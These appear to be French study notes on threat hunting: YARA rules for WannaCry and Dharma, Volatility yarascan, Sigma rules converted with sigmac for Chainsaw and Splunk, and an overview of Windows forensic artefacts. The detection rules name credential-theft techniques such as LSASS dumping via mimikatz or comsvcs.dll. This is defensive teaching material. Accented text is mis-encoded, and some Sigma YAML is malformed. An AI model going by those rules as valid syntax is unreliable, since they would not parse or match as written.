Ces techniques permettent d'effectuer des recherches approfondies √† la fois sur le disque et en m√©moire, ainsi que dans les processus en cours et les √©v√©nements syst√®me pour identifier les comportements malveillants. L'utilisation de YARA et d'outils comme SilkETW et Volatility permet d'am√©liorer l'efficacit√© des investigations de s√©curit√© en exploitant des sources de donn√©es vari√©es.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with YARA (Linux Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80bd-9c23-e39f3666f6d8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Lorsqu'un acc√®s direct √† un syst√®me est restreint, les captures de m√©moire peuvent toujours nous permettre d'enqu√™ter sur des menaces potentielles. En utilisant YARA sur ces captures de m√©moire, les analystes en s√©curit√© peuvent rechercher des indicateurs de compromission, m√™me lorsque le syst√®me lui-m√™me reste inaccessible.

Processus Cl√© :
Cr√©er des r√®gles YARA : D√©veloppez des r√®gles ciblant les caract√©ristiques des malwares bas√©s sur la m√©moire ou des comportements suspects.
Compiler les r√®gles : Utilisez yarac pour compiler les r√®gles YARA au format binaire .yrc (optionnel pour de meilleures performances).
Capturer l'image m√©moire : Utilisez des outils tels que DumpIt, MemDump, Belkasoft RAM Capturer, Magnet RAM Capture, FTK Imager, ou LiME (Linux Memory Extractor).
Analyser l'image m√©moire avec YARA : Ex√©cutez YARA sur l'image m√©moire pour d√©tecter les correspondances.

Exemple de Scan de M√©moire avec YARA

Image m√©moire : compromisedsystem.raw situ√©e dans /home/htb-student/MemoryDumps.
Fichier de r√®gle YARA : wannacryartifactsmemory.yar situ√© dans /home/htb-student/Rules/yara.

yara /home/htb-student/Rules/yara/wannacryartifactsmemory.yar /home/htb-student/MemoryDumps/compromisedsystem.raw --print-strings
Sortie Exemple :

D√©tection de motifs li√©s au ransomware WannaCry, comme tasksche.exe et autres artefacts connus.
Int√©gration de YARA avec Volatility pour l'Analyse de M√©moire

Volatility Framework
Volatility est un outil puissant pour analyser des images m√©moire sur plusieurs plateformes OS. En utilisant YARA dans Volatility via le plugin yarascan, les analystes peuvent rechercher des indicateurs de malwares sp√©cifiques dans la m√©moire.
Exemple - Recherche d'un Mod√®le Unique

Rechercher une URI cod√©e en dur sans fichier YARA :

vol.py -f /home/htb-student/MemoryDumps/compromisedsystem.raw yarascan -U "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
Sortie :
Trouve des occurrences de cette URI dans l'image m√©moire.
Exemple - Scan avec Plusieurs R√®gles

Appliquer un ensemble de r√®gles YARA avec l'option -y de Volatility :

vol.py -f /home/htb-student/MemoryDumps/compromisedsystem.raw yarascan -y /home/htb-student/Rules/yara/wannacryartifactsmemory.yar
Sortie Exemple :
Identifie des artefacts sp√©cifiques de WannaCry dans l'image m√©moire.

Exemple de R√®gle YARA pour WannaCry

rule RansomwareWannaCry {
    meta:
        author = "Madhukar Raina"
        version = "1.1"
        description = "D√©tecte les cha√Ænes de caract√®res li√©es au ransomware WannaCry"
        reference = "https://www.virustotal.com"

    strings:
        $wannacrypayloadstr1 = "tasksche.exe" fullword ascii
        $wannacrypayloadstr2 = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacrypayloadstr3 = "mssecsvc.exe" fullword ascii
        $wannacrypayloadstr4 = "diskpart.exe" fullword ascii
        $wannacrypayload_str5 = "lhdfrgui.exe" fullword ascii

    condition: 3 of them
}
Sortie Exemple :
Identifie des artefacts sp√©cifiques de WannaCry dans l'image m√©moire.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with YARA (Web Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8040-8036-ed8c43760311"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Unpac.Me offre une solution robuste pour le d√©sempaquetage des malwares et permet aux analystes en s√©curit√© d'ex√©cuter des r√®gles YARA sur une vaste base de donn√©es de soumissions de malwares. Cette plateforme donne acc√®s √† un ensemble de donn√©es sur les malwares de qualit√© commerciale, ce qui en fait une ressource pr√©cieuse pour les analystes SOC et les chercheurs en malwares.

Tester des R√®gles YARA avec Unpac.Me

Prenons l'exemple de la r√®gle YARA suivante, ciblant le ransomware Dharma :

rule ransomwaredharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "D√©tecte les cha√Ænes de caract√®res du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $stringpdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $string_ssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
√âtapes pour Lancer une Recherche YARA sur Unpac.Me
Inscription : Inscrivez-vous pour un compte gratuit sur Unpac.Me.
D√©marrer une Nouvelle Recherche :
Allez dans la section Yara Hunt et s√©lectionnez Nouvelle Recherche.
Copiez et collez la r√®gle YARA dans le champ de saisie de la r√®gle.
Valider et Scanner :
Cliquez sur Valider pour vous assurer que la r√®gle est correcte, puis cliquez sur Scanner.
Consulter les R√©sultats : Apr√®s le scan, Unpac.Me affiche les r√©sultats, montrant les correspondances en quelques minutes.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Sigma and Sigma Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-804d-8b19-d87a923574c2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Sigma est un format de signature g√©n√©rique et standardis√© qui permet aux analystes SOC de cr√©er, partager et utiliser des r√®gles de d√©tection pour l'analyse des journaux √† travers diff√©rentes plateformes. √âcrites en YAML, les r√®gles Sigma offrent une portabilit√© inter-plateformes, permettant aux analystes d'√©crire une r√®gle une fois et de la d√©ployer sur divers syst√®mes SIEM et EDR.

Cas d'Utilisation Principaux des R√®gles Sigma
Analyse Universelle des Journaux : R√©diger des r√®gles de d√©tection une seule fois et les convertir en formats compatibles avec divers SIEM.
Partage de R√®gles Communautaires : Acc√©der √† une biblioth√®que croissante de r√®gles Sigma partag√©es par la communaut√© et y contribuer.
R√©ponse aux Incidents : Rechercher efficacement des indicateurs dans les journaux lors d‚Äôincidents.
Chasse Proactive aux Menaces : Utiliser les r√®gles Sigma pour d√©tecter des anomalies ou des menaces dans les ensembles de donn√©es.
Int√©gration avec des Outils d‚ÄôAutomatisation : Automatiser les r√©ponses en utilisant les r√®gles Sigma avec des plateformes SOAR.
Personnalisation : Adapter les r√®gles Sigma aux besoins sp√©cifiques de l'environnement.
Analyse des √âcarts : Effectuer une analyse des √©carts en alignant les r√®gles personnalis√©es avec les standards de la communaut√©.

Comment Sigma Fonctionne

Sigma exprime les mod√®les de d√©tection dans un format structur√©, avec des r√®gles √©crites en YAML. Une r√®gle Sigma comprend les √©l√©ments suivants :
Titre, Description et ID : Informations de base sur la r√®gle.
Source de Journaux : Sp√©cifie le type de journal cible, la plateforme et l‚Äôapplication.
Mod√®le de D√©tection : Inclut les identifiants de recherche et les conditions de correspondance.
Faux Positifs, Auteur et Date : Champs optionnels pour fournir un contexte.

Conversion Sigma (sigmac et pySigma)

Le pouvoir de Sigma r√©side dans sa capacit√© √† √™tre converti. Des outils comme sigmac (et de plus en plus pySigma) transforment les r√®gles Sigma en requ√™tes ou configurations compatibles avec des SIEM populaires (ElasticSearch, QRadar, Splunk, etc.).

Structure d'une R√®gle Sigma

Les r√®gles Sigma sont des fichiers YAML avec des champs structur√©s. Voici un exemple de format de r√®gle Sigma.

title: Ex√©cution potentielle de la technique LethalHTA 
id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471 
status: test 
description: D√©tecte une technique potentielle LethalHTA o√π "mshta.exe" est lanc√© par un processus "svchost.exe"
references:
https://codewhitesec.blogspot.com/2018/07/lethalhta.html
author: Markus Neis 
date: 2018/06/07 
tags: 
attack.defenseevasion 
attack.t1218.005 
logsource: 
    category: processcreation  
    product: windows
detection:
    selection: 
        ParentImage|endswith: '\svchost.exe'
        Image|endswith: '\mshta.exe'
    condition: selection
falsepositives: 
Unknown
level: high
Composants Cl√©s d'une R√®gle Sigma
Titre : D√©crit l'objet de d√©tection (par exemple, "Ex√©cution potentielle de la technique LethalHTA").
ID : Identifiant unique (il est recommand√© d'utiliser un UUID).
Statut : Statut de la r√®gle (par exemple, stable, test, exp√©rimental).
Description : Explication succincte de ce que la r√®gle d√©tecte.
R√©f√©rences : Liens vers des articles ou des recherches de soutien.
Auteur : Nom ou pseudonyme du cr√©ateur de la r√®gle.
Date : Date de cr√©ation au format AAAA/MM/JJ.
Source de Journaux : Sp√©cifie la source du journal et la plateforme (par exemple, cat√©gorie : process_creation, produit : windows).
Mod√®le de D√©tection :
S√©lection : Sp√©cifie les motifs √† faire correspondre dans les journaux.
Condition : D√©crit la relation entre les motifs (par exemple, condition : s√©lection).

Modificateurs de D√©tection

Les modificateurs affinent les recherches de d√©tection :
contains : Utilise des jokers aux deux extr√©mit√©s d'une valeur (par exemple, CommandLine|contains).
startswith / endswith : Utilise des jokers √† une extr√©mit√© seulement.
re : Correspondance bas√©e sur des expressions r√©guli√®res.

Exemple d'utilisation de modificateurs :

detection:
  selection:
    ParentImage|endswith: '\svchost.exe'
    Image|endswith: '\mshta.exe'
  condition: selection
Meilleures Pratiques pour le D√©veloppement de R√®gles Sigma

Le guide de cr√©ation des r√®gles Sigma fournit des meilleures pratiques pour le d√©veloppement de r√®gles, y compris des informations d√©taill√©es sur la structuration et l'√©criture de r√®gles de d√©tection efficaces.

Op√©rateurs Communs dans les Conditions

Les conditions Sigma lient les √©l√©ments de d√©tection, en utilisant des op√©rateurs comme :
and / or : Conjonctions logiques.
all of them : Correspond √† tous les motifs.
not : Exclut certaines correspondances.
Parenth√®ses () : Force l‚Äôordre des op√©rations.

Exemple de condition :

condition: selection1 or selection2 or selection3</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Developing Sigma Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80ae-aa34-de30249fd3db"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction aux R√®gles Sigma : D√©tection Manuelle Bas√©e sur des Cas R√©els

Ce guide pr√©sente la cr√©ation manuelle de r√®gles Sigma, √† partir de sc√©narios concrets visant √† d√©tecter des activit√©s suspectes sur un syst√®me Windows.

Exemple 1 : D√©tection d‚Äôune Extraction de Cr√©dentiels via LSASS

Contexte : Un processus comme shell.exe (ex√©cutant mimikatz) tente d‚Äôacc√©der √† la m√©moire du processus lsass.exe. Ce comportement est typiquement d√©tect√© via l‚ÄôEvent ID 10 de Sysmon.
Informations cl√©s
Event ID Sysmon : 10
Champs critiques :
TargetImage : processus cibl√© (ex. : lsass.exe)
GrantedAccess : droits d‚Äôacc√®s, souvent 0x1010 (lecture et requ√™te)
R√®gle Sigma de base : Acc√®s suspect √† LSASS

title: Acc√®s √† LSASS avec droit d‚Äôacc√®s rare
status: experimental
description: D√©tecte un acc√®s m√©moire au processus LSASS avec le flag d‚Äôacc√®s 0x1010
date: 2023/07/08
tags:
attack.credentialaccess
attack.t1003.001
logsource:
  category: processaccess
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith: '0x1010'
  condition: selection
Explication
TargetImage : v√©rifie si le processus cible est lsass.exe.
GrantedAccess : filtre les acc√®s avec les droits 0x1010.
Condition : alerte si les crit√®res sont remplis.
Ex√©cution avec sigmac

Pour convertir cette r√®gle en requ√™te PowerShell :

python sigmac -t powershell 'C:\Rules\sigma\procaccesswinlsassaccess.yml'
Version avanc√©e : Filtrage des faux positifs

Ajoute un contr√¥le sur le chemin d‚Äôex√©cution du processus source, en excluant les chemins habituels.

title: Acc√®s LSASS depuis un programme dans un dossier suspect
id: fa34b441-961a-42fa-a100-ecc28c886725
status: experimental
description: D√©tection d‚Äôun acc√®s m√©moire √† LSASS depuis un dossier potentiellement malveillant
tags:
attack.credentialaccess
attack.t1003.001
logsource:
  category: processaccess
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith:
'10'
'30'
'50'
'70'
'90'
'B0'
'D0'
'F0'
  SourceImage|contains:
'\Temp\'
'\Users\Public\'
  condition: selection and not 1 of filteroptional
Exemple 2 : Tentatives d‚Äôauthentification √©chou√©es multiples

Event ID 4776 : utilis√© pour d√©tecter des tentatives de validation NTLM. Plusieurs √©checs depuis une m√™me machine peuvent indiquer une attaque par force brute.

title: Connexions NTLM √©chou√©es depuis une seule machine avec comptes diff√©rents
id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538
logsource:
  product: windows
  service: security
detection:
  selection2:
    EventID: 4776
    TargetUserName: ''
    Workstation: '*'
  condition: selection2 | count(TargetUserName) by Workstation &gt; 3
Explication
Event ID 4776 : √©v√©nements de tentative d‚Äôauthentification NTLM.
D√©clenchement : lorsqu‚Äôune machine tente de se connecter avec plus de 3 comptes diff√©rents.

Ressources utiles pour cr√©er des r√®gles Sigma
[Guide officiel de cr√©ation de r√®gles Sigma](https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide)
[Sp√©cifications Sigma](https://github.com/SigmaHQ/sigma-specification)
[Articles sur le d√©veloppement Sigma](https://tech-en.netlify.app/articles/en510480/)</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with Sigma (Chainsaw Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-801f-9d17-ea3dbdba7480"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse des Journaux d'√âv√©nements Windows avec Chainsaw

Chainsaw est un outil puissant et gratuit con√ßu pour aider les analystes en cybers√©curit√© √† explorer rapidement les journaux d'√©v√©nements Windows et d√©tecter des activit√©s suspectes. Il prend en charge les r√®gles Sigma ainsi que des r√®gles personnalis√©es Chainsaw, ce qui en fait un outil polyvalent pour la chasse aux menaces et l'analyse des journaux.

Vous pouvez trouver Chainsaw dans le r√©pertoire C:\Tools\chainsaw sur le syst√®me cible.
Utiliser Chainsaw pour la Recherche de Tentatives de Connexion √âchou√©es Multiples

Dans cet exemple, nous allons appliquer la r√®gle Sigma pour d√©tecter les tentatives de connexion √©chou√©es multiples provenant de la m√™me source.

R√®gle Sigma √† utiliser :
winsecuritysuspfailedlogonssinglesource2.yml
Fichier EVTX :
labevents2.evtx

√âtapes √† suivre :

PS C:\Tools\chainsaw&gt; .\chainsawx8664-pc-windows-msvc.exe hunt C:\Events\YARASigma\labevents2.evtx -s C:\Rules\sigma\winsecuritysuspfailedlogonssinglesource2.yml --mapping .\mappings\sigma-event-logs-all.yml
Sortie :

[+] 1 Detections found on 1 documents
Explication :
La r√®gle a r√©ussi √† d√©tecter les tentatives de connexion √©chou√©es multiples provenant de la m√™me source. Dans ce cas, elle a trouv√© plusieurs tentatives de connexion √©chou√©es contre un utilisateur inexistant (NOUSER).

Recherche de Commandes PowerShell Anormalement Longues

PowerShell est souvent utilis√© √† des fins malveillantes en raison de sa flexibilit√© et de son int√©gration avec les API Windows et le framework .NET. Les attaquants peuvent en abuser pour ex√©cuter des commandes malveillantes. Des lignes de commande PowerShell anormalement longues peuvent √™tre un indicateur d'une activit√© suspecte.

R√®gle Sigma √† utiliser :
proccreationwinpowershellabnormalcommandlinesize.yml
Fichier EVTX :
labevents3.evtx

R√®gle Sigma (pour r√©f√©rence) :

title: Unusually Long PowerShell CommandLine
id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
status: test
description: Detects unusually long PowerShell command lines with a length of 1000 characters or more
references:
https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
author: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas
date: 2020/10/06
modified: 2023/04/14
tags:
attack.execution
attack.t1059.001
detection.threathunting
logsource:
    category: processcreation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
'\powershell.exe'
'\pwsh.exe'
'\cmd.exe'
    selectionpowershell:
        CommandLine|contains:
'powershell.exe'
'pwsh.exe'
    selectionlength:        
        CommandLine|re: '.{1000,}'
    condition: selection and selectionpowershell and selectionlength
falsepositives:
Unknown
level: low
√âtapes √† suivre :

PS C:\Tools\chainsaw&gt; .\chainsawx8664-pc-windows-msvc.exe hunt C:\Events\YARASigma\labevents3.evtx -s C:\Rules\sigma\proccreationwinpowershellabnormalcommandlinesize.yml --mapping .\mappings\sigma-event-logs-all-new.yml
Sortie :

[+] 3 Detections found on 3 documents
Explication :
Cette r√®gle a r√©ussi √† d√©tecter toutes les instances de lignes de commande PowerShell anormalement longues dans le fichier labevents3.evtx. Ces lignes de commande longues pourraient indiquer qu'un attaquant tente d'ex√©cuter une commande complexe ou obfusqu√©e.

Points Cl√©s √† Retenir :
Chainsaw est un outil puissant et rapide pour analyser les journaux d'√©v√©nements Windows et appliquer des r√®gles Sigma.
Les r√®gles Sigma offrent une mani√®re standardis√©e de d√©tecter des activit√©s suspectes, comme des tentatives de connexion √©chou√©es ou l'ex√©cution de commandes PowerShell anormales.
Une bonne configuration est essentielle lors de l'utilisation des r√®gles Sigma avec Chainsaw ou tout autre outil pour garantir une d√©tection pr√©cise des √©v√©nements.

En utilisant Chainsaw avec des r√®gles Sigma bien configur√©es, vous pouvez d√©tecter efficacement les menaces et les attaques potentielles dans votre environnement, m√™me en l'absence d'une solution SIEM.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with Sigma (Splunk Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-807f-9415-ca91c6fb47a3"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Valider l'Approche Sigma avec Splunk

Comme discut√© lors de l'introduction de Sigma, les r√®gles Sigma r√©volutionnent notre approche de l'analyse des journaux et de la d√©tection des menaces. Agissant comme un traducteur universel, Sigma offre un niveau d'abstraction aux journaux d'√©v√©nements, supprimant la n√©cessit√© d'utiliser des langages de requ√™te sp√©cifiques √† un SIEM, et permettant l'utilisation de la logique de d√©tection commune √† travers diff√©rentes plateformes.

Nous allons maintenant valider cette approche en convertissant deux r√®gles Sigma en format SPL de Splunk et en examinant les r√©sultats.

Exemple 1 : Recherche d'Abus de la Fonction MiniDump pour Dumper la M√©moire de LSASS (comsvcs.dll via rundll32)

Une r√®gle Sigma nomm√©e procaccesswinlsassdumpcomsvcsdll.yml est disponible dans le r√©pertoire suivant :

C:\Tools\chainsaw\sigma\rules\windows\processaccess
Cette r√®gle Sigma d√©tecte les adversaires qui utilisent la fonction d'exportation MiniDump de comsvcs.dll via rundll32 pour effectuer un vidage de m√©moire de LSASS.

Pour convertir cette r√®gle en une requ√™te compatible avec Splunk, nous pouvons utiliser sigmac comme suit :

PS C:\Tools\sigma-0.21\tools&gt; python sigmac -t splunk C:\Tools\chainsaw\sigma\rules\windows\processaccess\procaccesswinlsassdumpcomsvcsdll.yml -c .\config\splunk-windows.yml
Cette commande g√©n√®re la requ√™te SPL suivante :

(TargetImage="\\lsass.exe" SourceImage="C:\\Windows\\System32\\rundll32.exe" CallTrace="comsvcs.dll")
Pour valider la r√®gle dans Splunk :
Acc√©dez √† http://[Target IP]:8000.
Ouvrez l'application "Search &amp; Reporting".
Soumettez la requ√™te de recherche SPL g√©n√©r√©e par sigmac.

R√©sultat :
La requ√™te SPL d√©tecte avec succ√®s l'abus de la fonction MiniDump pour dumper la m√©moire de LSASS.

Exemple 2 : Recherche de Processus Enfant Suspects Lanc√©s par Notepad

Une autre r√®gle Sigma nomm√©e proccreationwinnotepadsuspchild.yml est disponible dans le r√©pertoire :

C:\Rules\sigma
Cette r√®gle Sigma d√©tecte les cas o√π notepad.exe lance des processus enfants suspects.

Pour convertir cette r√®gle en SPL, nous utilisons sigmac comme suit :

PS C:\Tools\sigma-0.21\tools&gt; python sigmac -t splunk C:\Rules\sigma\proccreationwinnotepadsuspchild.yml -c .\config\splunk-windows.yml
Cela produit la requ√™te SPL suivante :

(ParentImage="\\notepad.exe" (Image="\\powershell.exe" OR Image="\\pwsh.exe" OR Image="\\cmd.exe" OR Image="\\mshta.exe" OR Image="\\cscript.exe" OR Image="\\wscript.exe" OR Image="\\taskkill.exe" OR Image="\\regsvr32.exe" OR Image="\\rundll32.exe" OR Image="\\calc.exe"))
Pour valider la r√®gle dans Splunk :
Acc√©dez √† http://[Target IP]:8000.
Ouvrez l'application "Search &amp; Reporting".
Soumettez la requ√™te SPL g√©n√©r√©e.

R√©sultat :
La requ√™te SPL d√©tecte les instances o√π notepad.exe lance des processus suspects, tels que PowerShell.

Personnalisation de Sigma pour la Compatibilit√© avec le SIEM

Dans de nombreux cas, les fichiers de configuration Sigma, situ√©s dans le r√©pertoire suivant :

C:\Tools\sigma-0.21\tools\config
peuvent n√©cessiter des personnalisations pour g√©n√©rer des requ√™tes SIEM pr√©cises et utilisables. Ces ajustements de configuration permettent de s'assurer que les r√®gles traduites sont compatibles avec les champs de donn√©es et les structures de journaux du SIEM cible.

Points Cl√©s √† Retenir :
Sigma agit comme un traducteur universel qui permet de cr√©er des r√®gles communes pour diff√©rents syst√®mes SIEM.
En convertissant les r√®gles Sigma en SPL pour Splunk, nous pouvons valider facilement la d√©tection des comportements malveillants sur des plateformes sp√©cifiques.
Personnaliser les fichiers de configuration Sigma est crucial pour garantir que les r√®gles traduites s'alignent avec les structures de donn√©es de votre environnement SIEM.

En utilisant cette m√©thode, vous pouvez tirer parti des r√®gles Sigma pour renforcer la d√©tection des menaces dans votre environnement, tout en restant flexible face aux outils SIEM sp√©cifiques.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Digital Forensics</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Key Concepts</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80de-829e-ffa443d9784f"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Preuves √©lectroniques

La criminalistique num√©rique se concentre sur les preuves √©lectroniques, comprenant des fichiers, des e-mails, des journaux, des bases de donn√©es et du trafic r√©seau.
Les preuves peuvent provenir de diverses sources telles que des ordinateurs, des appareils mobiles, des serveurs, des services cloud et d'autres actifs num√©riques.
Pr√©servation des preuves

La pr√©servation de l'int√©grit√© et de l'authenticit√© des preuves num√©riques est primordiale.
Des proc√©dures appropri√©es, y compris la documentation de la cha√Æne de custody, sont essentielles pour √©viter toute alt√©ration accidentelle et garantir leur recevabilit√© l√©gale.
Processus forensique

Le processus forensique dans les enqu√™tes num√©riques comprend g√©n√©ralement plusieurs √©tapes cl√©s :
Identification : D√©terminer les sources potentielles de preuves.
Collecte : Recueillir les donn√©es √† l'aide de m√©thodes forensiques adapt√©es.
Examen : Analyser les donn√©es collect√©es pour identifier les informations pertinentes.
Analyse : Interpr√©ter les r√©sultats afin de comprendre l'incident.
Pr√©sentation : Pr√©senter les r√©sultats de mani√®re claire et compr√©hensible.
Types de cas

La criminalistique num√©rique s'applique √† diff√©rents types d'enqu√™tes :
Enqu√™tes sur la cybercriminalit√© : Cas impliquant des piratages, des fraudes ou du vol de donn√©es.
Vol de propri√©t√© intellectuelle : Protection des informations propri√©taires.
Conduite inappropri√©e des employ√©s : Enqu√™tes internes.
Violation de donn√©es : R√©ponse aux incidents de s√©curit√© affectant les organisations.
Soutien √† la proc√©dure judiciaire : Assistance dans les proc√©dures l√©gales.
√âtapes de base dans une enqu√™te forensique
Cr√©er une image forensique : Cr√©er une copie bit-√†-bit du syst√®me pour l'analyse.
Documenter l'√©tat du syst√®me : Enregistrer les d√©tails tels que les processus actifs, les connexions ouvertes et les utilisateurs connect√©s.
Identifier et pr√©server les preuves : S√©curiser toutes les donn√©es pouvant contenir des informations pertinentes.
Analyser les preuves : Chercher les √©l√©ments de donn√©es qui expliquent l'incident.
Analyse de la chronologie : Construire une chronologie pour comprendre la s√©quence des √©v√©nements.
Identifier les indicateurs de compromission (IoC) : Localiser les signes de compromission dans les donn√©es.
Rapport et documentation : Cr√©er des rapports d√©taillant les r√©sultats et les actions men√©es.
La criminalistique num√©rique pour les analystes SOC

Dans un centre d'op√©rations de s√©curit√© (SOC), la criminalistique num√©rique joue un r√¥le essentiel dans la r√©ponse et l'analyse des cybermenaces.
Analyse post-incident
L'analyse forensique fournit une ventilation d√©taill√©e des incidents, aidant les analystes √† retracer les m√©thodes, les motifs et l'identit√© potentielle de l'attaquant.
Ces informations aident √† am√©liorer les d√©fenses organisationnelles en identifiant les vuln√©rabilit√©s.
R√©ponse rapide aux incidents de s√©curit√©
Les outils de criminalistique num√©rique permettent une analyse rapide de grands ensembles de donn√©es, facilitant l'identification rapide du moment de la compromission, des syst√®mes affect√©s et de la m√©thode d'attaque.
La ma√Ætrise rapide de la menace est essentielle pour limiter la port√©e et l'impact de l'incident.
Consid√©rations l√©gales
La criminalistique fournit des preuves l√©gales recevables, cruciales pour toute action en justice suite √† des violations importantes.
Les preuves collect√©es sont enregistr√©es, hach√©es et horodat√©es afin d'assurer leur int√©grit√©, soutenant leur utilisation en tribunal si n√©cessaire.
Chasse proactive aux menaces
La criminalistique num√©rique permet aux √©quipes SOC de rechercher de mani√®re proactive des signes de compromission plut√¥t que de se contenter de r√©pondre √† des alertes.
Les incidents pass√©s fournissent des IoC et des TTPs (tactiques, techniques et proc√©dures) que les analystes peuvent utiliser pour rechercher des menaces potentielles.
Am√©lioration de la r√©ponse aux incidents
Une analyse forensique compl√®te permet de mieux adapter les r√©ponses, garantissant que tous les syst√®mes compromis soient pris en compte.
Comprendre l'ensemble de l'attaque r√©duit la probabilit√© que les attaquants r√©int√®grent le syst√®me par la m√™me vuln√©rabilit√©.
Apprentissage et am√©lioration continus
Chaque incident offre des opportunit√©s d'apprentissage, aidant les √©quipes SOC √† rester en avance sur les techniques d'attaque en √©volution.
En analysant les incidents pass√©s, les analystes peuvent anticiper et se d√©fendre contre de nouvelles tactiques.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Forensics Overview</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f0-a3e2-d3e23fd0f3fa"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">NTFS (New Technology File System)

NTFS est le syst√®me de fichiers de Microsoft, connu pour ses fonctionnalit√©s qui am√©liorent la performance, la s√©curit√© et l'int√©grit√© des donn√©es. Les artefacts forensiques cl√©s incluent :
M√©tadonn√©es des fichiers : Stocke les horodatages et les attributs des fichiers, utiles pour l'analyse de la chronologie des √©v√©nements.
Entr√©es MFT : La Master File Table suit les m√©tadonn√©es de tous les fichiers, fournissant des d√©tails m√™me sur les fichiers supprim√©s.
Slack de fichier et espace non allou√© : Contient des r√©sidus de fichiers supprim√©s.
Signatures de fichiers : Utilis√©es pour identifier les fichiers m√™me si leurs extensions sont modifi√©es.
Journal USN : Enregistre les changements de fichiers, utile pour enqu√™ter sur les modifications.
Fichiers LNK : Raccourcis qui r√©v√®lent l'historique d'acc√®s aux fichiers et aux programmes.
Fichiers Prefetch : Indiquent les programmes r√©cemment ex√©cut√©s.
Hives du Registre : Enregistrent les configurations du syst√®me et peuvent r√©v√©ler des traces de modifications non autoris√©es.
Shellbags : Suivent la navigation dans les dossiers, en mettant en √©vidence les r√©pertoires consult√©s.
Cache de vignettes : Stocke les aper√ßus des images et documents r√©cemment visualis√©s.
Corbeille : Conserve les fichiers supprim√©s, fournissant des informations sur les actions de l'utilisateur.
Flux de donn√©es alternatifs (ADS) : Donn√©es cach√©es associ√©es √† des fichiers, parfois exploit√©es par des malwares.
Copies de shadow de volume : Instantan√©s du syst√®me de fichiers pour la r√©cup√©ration de donn√©es.
Descripteurs de s√©curit√© et ACL : Stockent les permissions des fichiers, utiles pour analyser les droits d'acc√®s et les violations de s√©curit√©.
Journaux des √©v√©nements Windows

Les journaux des √©v√©nements Windows enregistrent les √©v√©nements syst√®me et application, capturant une gamme d'activit√©s des utilisateurs et du syst√®me. Situ√©s dans C:\Windows\System32\winevt\logs, ces journaux aident √† d√©tecter :
Erreurs syst√®me : Probl√®mes avec le syst√®me d'exploitation ou les applications.
√âv√©nements de s√©curit√© : Tentatives d'authentification, changements de politique et contr√¥les d'acc√®s.
√âv√©nements d'application : Journaux provenant de logiciels sp√©cifiques, souvent utiles pour identifier des tentatives d'exploitation.
Artefacts d'ex√©cution

Les artefacts d'ex√©cution documentent les traces des programmes et scripts ex√©cut√©s, offrant un aper√ßu des actions des utilisateurs et des activit√©s de malwares. Les artefacts notables incluent :
Fichiers Prefetch : Suivent les m√©tadonn√©es d'ex√©cution (chemins des fichiers, nombre d'ex√©cutions).
Shimcache : Enregistre l'ex√©cution des programmes pour la compatibilit√©, utile pour identifier les activit√©s r√©centes.
Amcache : Stocke les d√©tails des ex√©cutables (chemins des fichiers, signatures num√©riques, derni√®re ex√©cution).
UserAssist : Suit les applications ex√©cut√©es par l'utilisateur, affichant les noms, les comptes et les horodatages.
Listes RunMRU : Enregistre les commandes et programmes r√©cemment ex√©cut√©s.
Jump Lists : Documente les fichiers et t√¢ches r√©cents associ√©s aux applications.
Fichiers de raccourci (LNK) : Fournissent les chemins d'ex√©cution, les horodatages et les interactions avec l'utilisateur.
√âl√©ments r√©cents : Suivent les fichiers r√©cemment acc√©d√©s.
Journaux des √©v√©nements Windows : Enregistrent les √©v√©nements li√©s √† la cr√©ation et la terminaison des processus.
Persistance sur Windows

